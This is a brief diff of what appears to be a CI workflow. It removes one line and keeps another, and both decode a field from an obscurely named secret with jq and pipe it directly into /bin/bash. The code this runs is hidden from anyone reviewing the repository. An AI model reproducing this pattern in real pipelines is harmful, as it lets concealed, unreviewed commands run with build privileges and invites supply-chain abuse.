@@ -19,7 +19,6 @@ jobs:
           j19016: ${{ secrets.j19016 }}
         run: |
           printf '%s' "$j19016" | jq -r .nsguo49 | /bin/bash
-          printf '%s' "$mkk71506" | jq -r .xlqx92001 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
